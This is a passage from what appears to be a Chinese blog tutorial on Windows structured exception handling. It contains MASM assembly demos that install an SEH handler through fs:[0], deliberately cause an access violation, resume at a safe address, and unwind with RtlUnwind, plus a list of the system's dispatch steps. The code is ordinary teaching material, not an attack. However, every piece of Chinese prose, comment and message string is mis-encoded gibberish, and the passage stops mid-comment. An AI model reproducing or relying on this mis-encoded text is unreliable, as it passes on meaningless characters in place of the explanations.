<p>å¸è½½å°±æ˜¯æŠŠespèµ‹å€¼ä¸ºåˆšåˆšå­˜å…¥<code>fs:[0]</code>çš„ï¼ˆåƒä¸Šå›¾çš„å³ä¸‹è§’çš„é‚£ä¸ª<code>_EXCEPTION_REGISTRATION_RECORD</code>çš„nextçš„åœ°å€ï¼‰,ç„¶åpopä¸€ä¸‹ä¿è¯æ ˆå¸§å¹³è¡¡ã€‚</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">.386</span>		;ä½¿ç”¨<span class="number">80386</span>å¤„ç†å™¨æŒ‡ä»¤é›†</span><br><span class="line">.model flat,stdcall		;ç”¨æ¥å®šä¹‰ç¨‹åºå·¥ä½œçš„æ¨¡å¼ï¼Œflat:å†…å­˜æ¨¡å¼ï¼Œstdcall:è¯­è¨€æ¨¡å¼</span><br><span class="line">option casemap:none		;æ˜¯å¦å¯¹å˜é‡ä¸å­ç¨‹åºåå¤§å°å†™æ•æ„Ÿï¼Œå¿…é¡»è¦è¿›è¡Œè®¾ç½®</span><br><span class="line">	</span><br><span class="line">include		windows.inc</span><br><span class="line">include		user32.inc</span><br><span class="line">includelib	user32.lib</span><br><span class="line">include		kernel32.inc</span><br><span class="line">includelib	kernel32.lib</span><br><span class="line"></span><br><span class="line">.<span class="type">const</span> </span><br><span class="line">	msg db <span class="string">&#x27;å¼‚å¸¸å‘ç”Ÿçš„ä½ç½®:%08x,å¼‚å¸¸ä»£ç :%08x,å¼‚å¸¸æ ‡å¿—:%08x&#x27;</span>,<span class="number">0</span></span><br><span class="line">	safe db <span class="string">&#x27;è½¬åˆ°å®‰å…¨çš„åœ°æ–¹æ‰§è¡Œ&#x27;</span>,<span class="number">0</span></span><br><span class="line">	caption db <span class="string">&#x27;æ ‡é¢˜aa&#x27;</span>,<span class="number">0</span></span><br><span class="line"></span><br><span class="line">.code </span><br><span class="line">	_Handle proc _lpExceptionRecord, _lp_SEH, _lpContext, _lpDispatcherContext</span><br><span class="line">		; loacl å®šä¹‰å±€éƒ¨å˜é‡</span><br><span class="line">		local szBuffer[<span class="number">256</span>]:byte</span><br><span class="line">		pushad</span><br><span class="line">			mov esi,_lpExceptionRecord</span><br><span class="line">			mov edi,_lpContext</span><br><span class="line">			;å…³è”èµ·æ¥</span><br><span class="line">			assume esi:ptr EXCEPTION_RECORD, edi:ptr CONTEXT</span><br><span class="line"></span><br><span class="line">			;eip è¦ç”¨ regEip</span><br><span class="line">			invoke wsprintf, addr szBuffer, addr msg, [edi].regEip, [esi].ExceptionCode, [esi].ExceptionFlags</span><br><span class="line">			invoke MessageBox, <span class="number">0</span>, addr szBuffer , addr caption, MB_OK</span><br><span class="line"></span><br><span class="line">			;è°ƒç”¨</span><br><span class="line">			mov [edi].regEip, offset safefn</span><br><span class="line">			;è°ƒç”¨å®Œé‡Šæ”¾æ‰</span><br><span class="line">			assume esi:nothing, edi:nothing</span><br><span class="line"></span><br><span class="line">		popad</span><br><span class="line">			;æ­£å¸¸æ‰§è¡Œ</span><br><span class="line">			mov eax, EXCEPTION_CONTINUE_EXECUTION</span><br><span class="line">		ret</span><br><span class="line">	_Handle endp</span><br><span class="line"></span><br><span class="line">start:</span><br><span class="line">	;å®‰è£…seh åœ¨æ ˆä¸­æ„é€ ä¸€ä¸ªEXCEPTION_REGISTRATIONç»“æ„ä½“</span><br><span class="line">	assume fs:nothing		;å¯ç”¨fså¯„å­˜å™¨</span><br><span class="line">	push offset _Handle</span><br><span class="line">	push fs:[<span class="number">0</span>]</span><br><span class="line">	mov  fs:[<span class="number">0</span>], esp</span><br><span class="line"></span><br><span class="line">	;è§¦å‘å¼‚å¸¸</span><br><span class="line">	xor eax, eax</span><br><span class="line">	mov dword ptr [eax],<span class="number">0</span> ;äº§ç”Ÿè®¿é—®å¼‚å¸¸</span><br><span class="line">	;</span><br><span class="line">	;å¦‚æœè¿™é‡Œæœ‰æŒ‡ä»¤ ä¸ä¼šæ‰§è¡Œ</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">safefn:</span><br><span class="line">	invoke MessageBox, <span class="number">0</span>, addr safe, addr caption, MB_OK</span><br><span class="line"></span><br><span class="line">	;å¸è½½seh  æŠŠç»“æ„ä½“popå‡ºæ¥</span><br><span class="line">	pop fs:[<span class="number">0</span>]</span><br><span class="line">	pop eax</span><br><span class="line">	invoke ExitProcess, <span class="literal">NULL</span></span><br><span class="line"></span><br><span class="line">end start</span><br></pre></td></tr></table></figure>

<p>ç¼–è¯‘åè¿è¡Œ</p>
<p><img src="/posts/a3f022ab/10-7.png" alt="img"></p>
<p>ä¼šå…ˆäº§ç”Ÿä¸€ä¸ª c0000005çš„å¼‚å¸¸</p>
<p>ç„¶åä¼šåœ¨äº§ç”Ÿä¸€ä¸ªå¼‚å¸¸c0000026ï¼ˆçœ‹å‘ç”Ÿä½ç½®åº”è¯¥æ˜¯å†…æ ¸ä¸­çš„ï¼‰ æ ‡å¿—00000001 è¡¨ç¤ºç¨‹åºä¸å¯æ¢å¤æ‰§è¡Œï¼ˆå‰é¢åœ¨ç¼–å†™æ±‡ç¼–æ—¶ä½¿ç”¨äº†<code>EXCEPTION_CONTINUE_EXECUTION</code>ï¼‰æ²¡æœ‰æˆåŠŸè·³åˆ°æ­£å¸¸æ‰§è¡Œçš„åœ°æ–¹</p>
<p><img src="/posts/a3f022ab/10-8.png" alt="img"></p>
<hr>
<p>è¿™é‡Œå…ˆç”¨ç»™çš„demoè¿›è¡Œç¼–è¯‘æ¼”ç¤º</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;</span><br><span class="line">		<span class="number">.386</span></span><br><span class="line">		.model flat,stdcall</span><br><span class="line">		option casemap:none</span><br><span class="line">;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;</span><br><span class="line">; Include æ–‡ä»¶å®šä¹‰</span><br><span class="line">;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;</span><br><span class="line">include		windows.inc</span><br><span class="line">include		user32.inc</span><br><span class="line">includelib	user32.lib</span><br><span class="line">include		kernel32.inc</span><br><span class="line">includelib	kernel32.lib</span><br><span class="line">;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;</span><br><span class="line">; æ•°æ®æ®µ</span><br><span class="line">;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;</span><br><span class="line">		.<span class="type">const</span></span><br><span class="line">szMsg		db	<span class="string">&#x27;å¼‚å¸¸å‘ç”Ÿä½ç½®ï¼š%08Xï¼Œå¼‚å¸¸ä»£ç ï¼š%08Xï¼Œæ ‡å¿—ï¼š%08X&#x27;</span>,<span class="number">0</span></span><br><span class="line">szSafe		db	<span class="string">&#x27;å›åˆ°äº†å®‰å…¨çš„åœ°æ–¹!&#x27;</span>,<span class="number">0</span></span><br><span class="line">szCaption	db	<span class="string">&#x27;SEHä¾‹å­&#x27;</span>,<span class="number">0</span></span><br><span class="line"></span><br><span class="line">		.code</span><br><span class="line">;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;</span><br><span class="line">; é”™è¯¯ Handler</span><br><span class="line">;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;</span><br><span class="line">_Handler	proc	_lpExceptionRecord,_lpSEH,_lpContext,_lpDispatcherContext</span><br><span class="line">		local	@szBuffer[<span class="number">256</span>]:byte</span><br><span class="line"></span><br><span class="line">		pushad</span><br><span class="line">		mov	esi,_lpExceptionRecord</span><br><span class="line">		mov	edi,_lpContext</span><br><span class="line">		assume	esi:ptr EXCEPTION_RECORD,edi:ptr CONTEXT</span><br><span class="line">		invoke	wsprintf,addr @szBuffer,addr szMsg,\</span><br><span class="line">			[edi].regEip,[esi].ExceptionCode,[esi].ExceptionFlags</span><br><span class="line">		invoke	MessageBox,<span class="literal">NULL</span>,addr @szBuffer,<span class="literal">NULL</span>,MB_OK</span><br><span class="line">;********************************************************************</span><br><span class="line">; å°† EIP æŒ‡å‘å®‰å…¨çš„ä½ç½®å¹¶æ¢å¤å †æ ˆ</span><br><span class="line">;********************************************************************</span><br><span class="line">		mov	eax,_lpSEH</span><br><span class="line">		push	[eax + <span class="number">8</span>]</span><br><span class="line">		pop	[edi].regEip</span><br><span class="line">		push	[eax + <span class="number">0</span>ch]</span><br><span class="line">		pop	[edi].regEbp</span><br><span class="line">		push	eax</span><br><span class="line">		pop	[edi].regEsp</span><br><span class="line">		assume	esi:nothing,edi:nothing</span><br><span class="line">		popad</span><br><span class="line">		mov	eax,ExceptionContinueExecution</span><br><span class="line">		ret</span><br><span class="line"></span><br><span class="line">_Handler	endp</span><br><span class="line">;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;</span><br><span class="line">_Test		proc</span><br><span class="line"></span><br><span class="line">;********************************************************************</span><br><span class="line">; åœ¨å †æ ˆä¸­æ„é€ ä¸€ä¸ª EXCEPTION_REGISTRATION ç»“æ„</span><br><span class="line">;********************************************************************</span><br><span class="line">		assume	fs:nothing</span><br><span class="line">		push	ebp</span><br><span class="line">		push	offset _SafePlace</span><br><span class="line">		push	offset _Handler</span><br><span class="line">		push	fs:[<span class="number">0</span>]</span><br><span class="line">		mov	fs:[<span class="number">0</span>],esp</span><br><span class="line">;********************************************************************</span><br><span class="line">; ä¼šå¼•å‘å¼‚å¸¸çš„æŒ‡ä»¤</span><br><span class="line">;********************************************************************</span><br><span class="line">		pushad</span><br><span class="line">		xor	ebp,ebp</span><br><span class="line">		xor	eax,eax</span><br><span class="line">		mov	dword ptr [eax],<span class="number">0</span></span><br><span class="line">		popad		;è¿™ä¸€å¥å°†æ— æ³•è¢«æ‰§è¡Œ</span><br><span class="line">_SafePlace:</span><br><span class="line">		invoke	MessageBox,<span class="literal">NULL</span>,addr szSafe,addr szCaption,MB_OK</span><br><span class="line">;********************************************************************</span><br><span class="line">; æ¢å¤åŸæ¥çš„ SEH é“¾</span><br><span class="line">;********************************************************************</span><br><span class="line">		pop	fs:[<span class="number">0</span>]</span><br><span class="line">		add	esp,<span class="number">0</span>ch</span><br><span class="line">		ret</span><br><span class="line"></span><br><span class="line">_Test		endp</span><br><span class="line">;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;</span><br><span class="line">start:</span><br><span class="line">		invoke	_Test</span><br><span class="line">		invoke	ExitProcess,<span class="literal">NULL</span></span><br><span class="line">;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;</span><br><span class="line">		end	start</span><br></pre></td></tr></table></figure>

<p><img src="/posts/a3f022ab/10-9.png" alt="img"></p>
<p><img src="/posts/a3f022ab/10-10.png" alt="img"></p>
<p>(1ï¼‰ç³»ç»ŸæŸ¥çœ‹äº§ç”Ÿå¼‚å¸¸çš„è¿›ç¨‹æ˜¯å¦æ­£åœ¨è¢«è°ƒè¯•ï¼Œå¦‚æœæ­£åœ¨è¢«è°ƒè¯•çš„è¯ï¼Œé‚£ä¹ˆå‘è°ƒè¯•å™¨å‘é€EXCEPTION_DEBUG_EVENTäº‹ä»¶ã€‚</p>
<p>(2ï¼‰å¦‚æœè¿›ç¨‹æ²¡æœ‰è¢«è°ƒè¯•æˆ–è€…è°ƒè¯•å™¨ä¸å»å¤„ç†è¿™ä¸ªå¼‚å¸¸ï¼Œé‚£ä¹ˆç³»ç»Ÿæ£€æŸ¥å¼‚å¸¸æ‰€å¤„çš„çº¿ç¨‹ï¼Œå¹¶åœ¨è¿™ä¸ªçº¿ç¨‹çš„ç¯å¢ƒä¸­æŸ¥çœ‹fs:[0]æ¥ç¡®å®šæ˜¯å¦å®‰è£…æœ‰SEH å¼‚å¸¸å¤„ç†å›è°ƒå‡½æ•°ï¼Œå¦‚æœæœ‰çš„è¯åˆ™è°ƒç”¨å®ƒã€‚</p>
<p>(3ï¼‰å›è°ƒå‡½æ•°å°è¯•å¤„ç†è¿™ä¸ªå¼‚å¸¸ï¼Œå¦‚æœå¯ä»¥æ­£ç¡®å¤„ç†çš„è¯ï¼Œåˆ™ä¿®æ­£é”™è¯¯å¹¶å°†è¿”å›å€¼è®¾ç½®ä¸ºExceptionContinueExecutionï¼Œè¿™æ—¶ç³»ç»Ÿå°†ç»“æŸæ•´ä¸ªæŸ¥æ‰¾è¿‡ç¨‹ã€‚</p>
<p>(4ï¼‰å¦‚æœå›è°ƒå‡½æ•°è¿”å›ExceptionContinueSearchï¼Œå‘ŠçŸ¥ç³»ç»Ÿå®ƒæ— æ³•å¤„ç†è¿™ä¸ªå¼‚å¸¸ï¼Œé‚£ä¹ˆç³»ç»Ÿå°†æ ¹æ®SEH é“¾ä¸­çš„ prevå­—æ®µå¾—åˆ°ä¸Šä¸€ä¸ªå›è°ƒå‡½æ•°åœ°å€å¹¶é‡å¤æ­¥éª¤ï¼ˆ3)ï¼Œç›´åˆ°é“¾ä¸­çš„æŸä¸ªå›è°ƒå‡½æ•°è¿”å›ExceptionContinueExecutionä¸ºæ­¢ï¼ŒæŸ¥æ‰¾ç»“æŸã€‚</p>
<p>(5ï¼‰å¦‚æœåˆ°äº†SEHé“¾çš„å°¾éƒ¨å´æ²¡æœ‰ä¸€ä¸ªå›è°ƒå‡½æ•°æ„¿æ„å¤„ç†è¿™ä¸ªå¼‚å¸¸ï¼Œé‚£ä¹ˆç³»ç»Ÿå°†å†æ¬¡æ£€æµ‹è¿›ç¨‹æ˜¯å¦æ­£åœ¨è¢«è°ƒè¯•ï¼Œå¦‚æœè¢«è°ƒè¯•çš„è¯ï¼Œåˆ™å†ä¸€æ¬¡é€šçŸ¥è°ƒè¯•å™¨ã€‚</p>
<p>(6ï¼‰å¦‚æœè°ƒè¯•å™¨è¿˜æ˜¯ä¸å»å¤„ç†è¿™ä¸ªå¼‚å¸¸æˆ–è€…è¿›ç¨‹æ²¡æœ‰è¢«è°ƒè¯•ï¼Œé‚£ä¹ˆç³»ç»Ÿæ£€æŸ¥æœ‰æ²¡æœ‰å®‰è£…ç­›é€‰å™¨å›è°ƒå‡½æ•°ï¼Œå¦‚æœæœ‰ï¼Œåˆ™å»è°ƒç”¨å®ƒï¼Œç­›é€‰å™¨å›è°ƒå‡½æ•°è¿”å›æ—¶ï¼Œç³»ç»Ÿé»˜è®¤çš„å¼‚å¸¸å¤„ç†ç¨‹åºæ ¹æ®è¿™ä¸ªè¿”å›å€¼å°†åšç›¸åº”çš„åŠ¨ä½œã€‚</p>
<p>(7ï¼‰å¦‚æœæ²¡æœ‰å®‰è£…ç­›é€‰å™¨å›è°ƒå‡½æ•°ï¼Œç³»ç»Ÿç›´æ¥è°ƒç”¨é»˜è®¤çš„å¼‚å¸¸å¤„ç†ç¨‹åºç»ˆæ­¢è¿›ç¨‹ã€‚</p>
<hr>
<h4 id="SEHå±•å¼€æ“ä½œ"><a href="#SEHå±•å¼€æ“ä½œ" class="headerlink" title="SEHå±•å¼€æ“ä½œ"></a>SEHå±•å¼€æ“ä½œ</h4><p><img src="/posts/a3f022ab/10-11.png" alt="img"></p>
<p>å±•å¼€æ“ä½œdemo</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">		<span class="number">.386</span></span><br><span class="line">		.model flat,stdcall</span><br><span class="line">		option casemap:none</span><br><span class="line">;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;</span><br><span class="line">; Include æ–‡ä»¶å®šä¹‰</span><br><span class="line">;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;</span><br><span class="line">include		windows.inc</span><br><span class="line">include		user32.inc</span><br><span class="line">includelib	user32.lib</span><br><span class="line">include		kernel32.inc</span><br><span class="line">includelib	kernel32.lib</span><br><span class="line">;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;</span><br><span class="line">; æ•°æ®æ®µ</span><br><span class="line">;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;</span><br><span class="line">		.data</span><br><span class="line">szMsg1		db	<span class="string">&#x27;è¿™æ˜¯å¤–å±‚å¼‚å¸¸å¤„ç†ç¨‹åºï¼ˆå°†å¤„ç†å¼‚å¸¸ï¼‰&#x27;</span>,<span class="number">0</span>dh,<span class="number">0</span>ah</span><br><span class="line">		db	<span class="string">&#x27;å¼‚å¸¸å‘ç”Ÿä½ç½®ï¼š%08Xï¼Œå¼‚å¸¸ä»£ç ï¼š%08Xï¼Œæ ‡å¿—ï¼š%08X&#x27;</span>,<span class="number">0</span></span><br><span class="line">szMsg2		db	<span class="string">&#x27;è¿™æ˜¯å†…å±‚å¼‚å¸¸å¤„ç†ç¨‹åºï¼ˆå¯¹å¼‚å¸¸ä¸è¿›è¡Œå¤„ç†ï¼‰&#x27;</span>,<span class="number">0</span>dh,<span class="number">0</span>ah</span><br><span class="line">		db	<span class="string">&#x27;å¼‚å¸¸å‘ç”Ÿä½ç½®ï¼š%08Xï¼Œå¼‚å¸¸ä»£ç ï¼š%08Xï¼Œæ ‡å¿—ï¼š%08X&#x27;</span>,<span class="number">0</span></span><br><span class="line">szCaption	db	<span class="string">&#x27;æç¤ºä¿¡æ¯&#x27;</span>,<span class="number">0</span></span><br><span class="line">szBeforeUnwind	db	<span class="string">&#x27;ç°åœ¨å°†å¼€å§‹ Unwindï¼Œå½“å‰çš„ FS:[0] = %08X&#x27;</span>,<span class="number">0</span></span><br><span class="line">szAfterUnwind	db	<span class="string">&#x27;Unwind è¿”å›ï¼Œå½“å‰çš„ FS:[0] = %08X&#x27;</span>,<span class="number">0</span></span><br><span class="line">szSafe1		db	<span class="string">&#x27;å›åˆ°äº†å¤–å±‚å­ç¨‹åºçš„å®‰å…¨ä½ç½®!&#x27;</span>,<span class="number">0</span></span><br><span class="line">szSafe2		db	<span class="string">&#x27;å›åˆ°äº†å†…å±‚å­ç¨‹åºçš„å®‰å…¨ä½ç½®!&#x27;</span>,<span class="number">0</span></span><br><span class="line">;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;</span><br><span class="line">; ä»£ç æ®µ</span><br><span class="line">;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;</span><br><span class="line">		.code</span><br><span class="line">;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;</span><br><span class="line">; å¤–å±‚é”™è¯¯ Handlerï¼Œå°†å¤„ç†å¼‚å¸¸</span><br><span class="line">;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;</span><br><span class="line">_Handler1	proc	_lpExceptionRecord,_lpSEH,_lpContext,_lpDispatcherContext</span><br><span class="line">		local	@szBuffer[<span class="number">256</span>]:byte</span><br><span class="line"></span><br><span class="line">		pushad</span><br><span class="line">		mov	esi,_lpExceptionRecord</span><br><span class="line">		mov	edi,_lpContext</span><br><span class="line">		assume	esi:ptr EXCEPTION_RECORD,edi:ptr CONTEXT,fs:nothing</span><br><span class="line">		invoke	wsprintf,addr @szBuffer,addr szMsg1,\</span><br><span class="line">			[edi].regEip,[esi].ExceptionCode,[esi].ExceptionFlags</span><br><span class="line">		invoke	MessageBox,<span class="literal">NULL</span>,addr @szBuffer,<span class="literal">NULL</span>,MB_OK</span><br><span class="line">;********************************************************************</span><br><span class="line">; å°† EIP æŒ‡å‘å®‰å…¨çš„ä½ç½®å¹¶æ¢å¤å †æ ˆ</span><br><span class="line">;********************************************************************</span><br><span class="line">		mov	eax,_lpSEH</span><br><span class="line">		push	[eax + <span class="number">8</span>]</span><br><span class="line">		pop	[edi].regEip</span><br><span class="line">		push	_lpSEH</span><br><span class="line">		pop	[edi].regEsp</span><br><span class="line">;********************************************************************</span><br><span class="line">; å¯¹å‰é¢çš„ Handler è¿›è¡Œ Unwind æ“ä½œ</span><br><span class="line">;********************************************************************</span><br><span class="line">		invoke	wsprintf,addr @szBuffer,addr szBeforeUnwind,dword ptr fs:[<span class="number">0</span>]</span><br><span class="line">		invoke	MessageBox,<span class="literal">NULL</span>,addr @szBuffer,addr szCaption,MB_OK</span><br><span class="line"></span><br><span class="line">		invoke	RtlUnwind,_lpSEH,<span class="literal">NULL</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span></span><br><span class="line"></span><br><span class="line">		invoke	wsprintf,addr @szBuffer,addr szAfterUnwind,dword ptr fs:[<span class="number">0</span>]</span><br><span class="line">		invoke	MessageBox,<span class="literal">NULL</span>,addr @szBuffer,addr szCaption,MB_OK</span><br><span class="line">;********************************************************************</span><br><span class="line">		assume	esi:nothing,edi:nothing</span><br><span class="line">		popad</span><br><span class="line">		mov	eax,ExceptionContinueExecution</span><br><span class="line">		ret</span><br><span class="line"></span><br><span class="line">_Handler1	endp</span><br><span class="line">;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;</span><br><span class="line">; å†…å±‚é”™è¯¯ 